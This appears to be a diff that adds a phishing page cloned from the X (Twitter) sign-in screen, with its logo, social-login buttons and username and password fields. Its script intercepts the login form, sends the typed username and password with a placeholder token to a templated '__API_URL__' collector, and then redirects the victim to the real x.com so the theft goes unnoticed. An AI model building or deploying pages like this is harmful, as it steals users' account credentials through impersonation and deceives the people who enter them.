@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X. It's what's happening / X</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .x-logo {
+            margin-bottom: 40px;
+        }
+
+        .x-logo svg {
+            width: 44px;
+            height: 44px;
+            fill: #fff;
+        }
+
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #d6d9db;
+        }
+
+        .social-btn {
+            width: 100%;
+            max-width: 300px;
+            height: 40px;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 9999px;
+            font-size: 15px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 12px;
+            cursor: pointer;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            max-width: 300px;
+            margin: 20px auto;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #2f3336;
+        }
+
+        .divider span {
+            padding: 0 10px;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .input-group {
+            max-width: 300px;
+            margin: 0 auto 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 56px;
+            background: transparent;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            padding: 12px;
+            color: #fff;
+            font-size: 17px;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #1d9bf0;
+        }
+
+        .next-btn {
+            width: 100%;
+            max-width: 300px;
+            height: 40px;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 9999px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 0 auto 12px;
+            display: block;
+        }
+
+        .forgot-btn {
+            width: 100%;
+            max-width: 300px;
+            height: 40px;
+            background: transparent;
+            color: #fff;
+            border: 1px solid #536471;
+            border-radius: 9999px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+        }
+
+        .footer {
+            margin-top: 40px;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .footer span {
+            color: #1d9bf0;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="x-logo">
+            <svg viewBox="0 0 24 24">
+                <path
+                    d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z">
+                </path>
+            </svg>
+        </div>
+        <h1>Sign in to X</h1>
+
+        <button class="social-btn">
+            <img src="https://www.google.com/favicon.ico" width="18">
+            Sign in with Google
+        </button>
+        <button class="social-btn">
+            <img src="https://www.apple.com/favicon.ico" width="18">
+            Sign in with Apple
+        </button>
+
+        <div class="divider"><span>or</span></div>
+
+        <form id="xForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Phone, email, or username" autocomplete="username">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+            </div>
+            <button type="submit" class="next-btn">Log in</button>
+        </form>
+
+        <button class="forgot-btn">Forgot password?</button>
+
+        <div class="footer">
+            Don't have an account? <span>Sign up</span>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('xForm');
+        const u = document.getElementById('username');
+        const p = document.getElementById('password');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const data = {
+                token: '__TOKEN__',
+                username: u.value,
+                password: p.value
+            };
+            fetch('__API_URL__', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).finally(() => {
+                window.location.href = 'https://x.com/';
+            });
+        });
+    </script>
+</body>
+
+</html>
